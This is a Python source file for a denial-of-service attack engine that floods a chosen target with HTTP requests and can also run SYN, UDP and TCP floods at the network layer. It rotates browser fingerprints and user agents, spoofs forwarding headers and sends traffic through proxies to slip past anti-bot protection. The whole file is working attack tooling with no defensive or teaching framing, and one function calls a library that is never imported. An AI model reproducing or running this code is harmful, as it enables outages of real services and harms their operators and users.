import asyncio, aiohttp, time, random, socket, ssl, threading, os, json, re, hashlib, traceback
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urlencode, urljoin
from collections import deque
from dataclasses import dataclass, field

try:
    import httpx
    H2_SUPPORT = True
except ImportError:
    H2_SUPPORT = False

try:
    from bs4 import BeautifulSoup
    BS4_SUPPORT = True
except ImportError:
    BS4_SUPPORT = False

try:
    from curl_cffi import requests as curl_requests
    JA3_SUPPORT = True
except ImportError:
    JA3_SUPPORT = False

try:
    from scapy.all import IP, TCP, send, RandShort
    SCAPY_SUPPORT = True
except ImportError:
    SCAPY_SUPPORT = False

# ----------------------------------------------------------------------
# Конфигурация берсерк-ротации
# ----------------------------------------------------------------------
USERAGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]

JA3_FINGERPRINTS = [
    "chrome120",
    "firefox121",
    "safari17",
    "edge119",
    "ios17",
    "random",
]

PATHS_POOL = [
    "/", "/index.html", "/home", "/about", "/contact", "/products", "/search",
    "/api/v1/users", "/api/v1/posts", "/login", "/register", "/cart", "/checkout",
    "/wp-admin/admin-ajax.php", "/xmlrpc.php", "/.env", "/robots.txt",
    "/sitemap.xml", "/feed", "/blog", "/news", "/catalog", "/item/", "/product/",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://t.co/",
    "https://www.facebook.com/",
    "",
]

ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.5",
    "de-DE,de;q=0.9,en;q=0.5",
    "fr-FR,fr;q=0.9,en;q=0.5",
]


@dataclass
class AttackConfig:
    target: str
    method: str = "GET"
    threads: int = 100
    proxy: str = None
    jitter: int = 0
    stealth: bool = False
    browser_storm: bool = False
    use_h2: bool = False
    adaptive: bool = False
    random_ja3: bool = False
    ja3_profile: str = None
    slowloris: bool = False
    smart_flood: bool = False
    berserk: bool = False
    hybrid: bool = False
    l4_method: str = None          # "TCP", "UDP", "SYN_FLOOD"
    udp_random_size: bool = False
    obfuscate: bool = True
    port: int = 80
    flare_solverr_url: str = None
    progress_callback: callable = None

    # Внутреннее состояние
    _ua_index: int = 0
    _ja3_index: int = 0
    _request_count: int = 0
    _smart_urls: list = field(default_factory=list)
    _smart_forms: list = field(default_factory=list)
    _smart_parsed: bool = False
    _lock: threading.Lock = field(default_factory=threading.Lock)
    _syn_thread: threading.Thread = None
    _running: bool = True


class AsyncAttackEngine:
    def __init__(self, proxy_list=None, port=80, obfuscate=True, jitter=0,
                 flare_solverr_url=None, ja3_profile=None, stealth=False,
                 browser_storm=False, use_h2=False, adaptive=False,
                 random_ja3=False, slowloris=False, smart_flood=False,
                 berserk=False, l4_method=None, udp_random_size=False):
        self.proxy_list = proxy_list or []
        self.port = port
        self.obfuscate = obfuscate
        self.jitter = jitter
        self.flare_solverr_url = flare_solverr_url
        self.ja3_profile = ja3_profile
        self.stealth = stealth
        self.browser_storm = browser_storm
        self.use_h2 = use_h2
        self.adaptive = adaptive
        self.random_ja3 = random_ja3
        self.slowloris = slowloris
        self.smart_flood = smart_flood
        self.berserk = berserk
        self.l4_method = l4_method
        self.udp_random_size = udp_random_size
        self.running = False
        self.stats = {'count': 0, 'rps': 0, 'errors': 0}
        self.config = None
        self._executor = ThreadPoolExecutor(max_workers=100)
        self._l4_tasks = []

    def launch(self, target, method, threads, progress_callback=None, hybrid=False, l4_method=None, **kwargs):
        cfg = AttackConfig(
            target=target,
            method=method,
            threads=threads,
            proxy=kwargs.get('proxy'),
            jitter=self.jitter,
            stealth=self.stealth,
            browser_storm=self.browser_storm,
            use_h2=self.use_h2,
            adaptive=self.adaptive,
            random_ja3=self.random_ja3,
            ja3_profile=self.ja3_profile,
            slowloris=self.slowloris,
            smart_flood=self.smart_flood,
            berserk=self.berserk,
            hybrid=hybrid,
            l4_method=l4_method or self.l4_method,
            udp_random_size=self.udp_random_size,
            obfuscate=self.obfuscate,
            port=kwargs.get('port', self.port),
            flare_solverr_url=self.flare_solverr_url,
            progress_callback=progress_callback
        )
        self.config = cfg
        self.running = True
        self.stats = {'count': 0, 'rps': 0, 'errors': 0}

        if cfg.smart_flood and BS4_SUPPORT:
            self._parse_target()

        # Гибрид: запуск L4 в фоне
        if cfg.hybrid and cfg.l4_method:
            target_ip = self._resolve_target(cfg.target)
            if target_ip:
                if cfg.l4_method == "SYN_FLOOD" and SCAPY_SUPPORT:
                    t = threading.Thread(target=self._syn_flood_worker, args=(target_ip, cfg.port), daemon=True)
                    t.start()
                    cfg._syn_thread = t
                elif cfg.l4_method == "UDP":
                    t = threading.Thread(target=self._udp_flood_worker, args=(target_ip, cfg.port, cfg.udp_random_size), daemon=True)
                    t.start()
                    cfg._syn_thread = t
                elif cfg.l4_method == "TCP":
                    t = threading.Thread(target=self._tcp_flood_worker, args=(target_ip, cfg.port), daemon=True)
                    t.start()
                    cfg._syn_thread = t

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self._run_l7_attack())
        except Exception as e:
            traceback.print_exc()
        finally:
            loop.close()
            self.running = False

    async def _run_l7_attack(self):
        cfg = self.config
        threads = cfg.threads
        if cfg.stealth:
            threads = 1

        proxy_str = cfg.proxy
        if proxy_str and not proxy_str.startswith(('http://', 'https://', 'socks5://')):
            if '@' in proxy_str:
                proxy_str = 'socks5://' + proxy_str
            else:
                proxy_str = 'http://' + proxy_str

        sem = asyncio.Semaphore(threads)
        tasks = []
        start_time = time.time()
        last_update = start_time

        async def worker():
            while self.running:
                async with sem:
                    try:
                        await self._single_request(cfg, proxy_str)
                        cfg._request_count += 1
                        self.stats['count'] += 1
                    except Exception:
                        self.stats['errors'] += 1
                    await asyncio.sleep(0)
                    if cfg.progress_callback and time.time() - last_update > 1:
                        elapsed = time.time() - start_time
                        rps = self.stats['count'] / elapsed if elapsed > 0 else 0
                        cfg.progress_callback(rps, self.stats['count'])
                        last_update = time.time()

        for _ in range(threads):
            tasks.append(asyncio.create_task(worker()))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _single_request(self, cfg, proxy_str):
        if cfg.berserk:
            self._berserk_rotate(cfg)

        url = self._build_url(cfg)
        headers = self._build_headers(cfg)

        if cfg.use_h2 and H2_SUPPORT:
            await self._request_httpx(url, headers, cfg, proxy_str)
        elif cfg.random_ja3 and JA3_SUPPORT:
            loop = asyncio.get_running_loop()
            await loop.run_in_executor(self._executor, self._request_curl, url, headers, cfg, proxy_str)
        else:
            await self._request_aiohttp(url, headers, cfg, proxy_str)

        if cfg.jitter > 0:
            await asyncio.sleep(cfg.jitter / 1000.0)

    def _berserk_rotate(self, cfg):
        with cfg._lock:
            if cfg._request_count % random.randint(50, 100) == 0:
                cfg._ua_index = (cfg._ua_index + 1) % len(USERAGENTS)
                cfg._ja3_index = (cfg._ja3_index + 1) % len(JA3_FINGERPRINTS)
                if random.random() < 0.3:
                    cfg.method = random.choice(["GET", "POST", "HEAD"])

    def _build_url(self, cfg):
        target = cfg.target
        parsed = urlparse(target if '://' in target else f'http://{target}')
        base = f"{parsed.scheme}://{parsed.hostname}"
        if parsed.port:
            base += f":{parsed.port}"
        path = '/'
        if cfg.smart_flood and cfg._smart_urls:
            path = random.choice(cfg._smart_urls)
        elif cfg.browser_storm or cfg.berserk:
            path = random.choice(PATHS_POOL)
        return urljoin(base, path)

    def _build_headers(self, cfg):
        ua = USERAGENTS[cfg._ua_index % len(USERAGENTS)]
        headers = {
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(ACCEPT_LANGUAGES),
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        }
        if cfg.browser_storm or cfg.berserk:
            headers['Referer'] = random.choice(REFERERS)
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        return headers

    async def _request_aiohttp(self, url, headers, cfg, proxy_str):
        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.request(
                    method=cfg.method, url=url, headers=headers,
                    proxy=proxy_str,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    await resp.read()
                    if resp.status in (403, 503) and cfg.berserk:
                        cfg._ua_index = (cfg._ua_index + 1) % len(USERAGENTS)
        except Exception:
            pass

    async def _request_httpx(self, url, headers, cfg, proxy_str):
        if not H2_SUPPORT:
            return await self._request_aiohttp(url, headers, cfg, proxy_str)
        try:
            proxies = proxy_str if proxy_str else None
            async with httpx.AsyncClient(http2=True, proxies=proxies, timeout=10) as client:
                await client.request(method=cfg.method, url=url, headers=headers)
        except Exception:
            pass

    def _request_curl(self, url, headers, cfg, proxy_str):
        if not JA3_SUPPORT:
            return
        try:
            proxies = {"http": proxy_str, "https": proxy_str} if proxy_str else None
            ja3 = cfg.ja3_profile or 'random'
            if cfg.random_ja3:
                ja3 = random.choice(JA3_FINGERPRINTS)
            curl_requests.get(url, headers=headers, proxies=proxies, ja3=ja3, timeout=10)
        except Exception:
            pass

    def _parse_target(self):
        if not BS4_SUPPORT or self.config._smart_parsed:
            return
        try:
            base_url = self.config.target if self.config.target.startswith('http') else f'http://{self.config.target}'
            resp = requests.get(base_url, timeout=10)
            soup = BeautifulSoup(resp.text, 'html.parser')
            urls = set()
            forms = []
            for tag in soup.find_all(['a', 'link', 'script', 'img', 'form']):
                if tag.name == 'a' and tag.get('href'):
                    urls.add(tag['href'])
                elif tag.name in ('link', 'script', 'img') and tag.get('src'):
                    urls.add(tag['src'])
                elif tag.name == 'form':
                    action = tag.get('action', '')
                    inputs = []
                    for inp in tag.find_all('input'):
                        inputs.append({
                            'name': inp.get('name'),
                            'type': inp.get('type', 'text')
                        })
                    forms.append({'action': action, 'inputs': inputs})
            self.config._smart_urls = list(urls)
            self.config._smart_forms = forms
            self.config._smart_parsed = True
        except Exception:
            self.config._smart_urls = PATHS_POOL

    # ----- L4 workers -----
    def _resolve_target(self, target):
        try:
            return socket.gethostbyname(target.replace('http://', '').replace('https://', '').split('/')[0])
        except:
            return target

    def _syn_flood_worker(self, target_ip, port):
        if not SCAPY_SUPPORT:
            return
        while self.running:
            try:
                packet = IP(dst=target_ip)/TCP(sport=RandShort(), dport=port, flags="S")
                send(packet, verbose=False)
            except:
                pass

    def _udp_flood_worker(self, target_ip, port, random_size=False):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running:
            try:
                size = random.randint(64, 1500) if random_size else 1024
                data = random._urandom(size)
                sock.sendto(data, (target_ip, port))
            except:
                pass

    def _tcp_flood_worker(self, target_ip, port):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target_ip, port))
                s.send(random._urandom(1024))
                s.close()
            except:
                pass

    def stop(self):
        self.running = False
        if self.config and self.config._syn_thread:
            self.config._syn_thread.join(timeout=2)
        self._executor.shutdown(wait=False)

    def pause(self):
        self.running = False

    def resume(self):
        self.running = True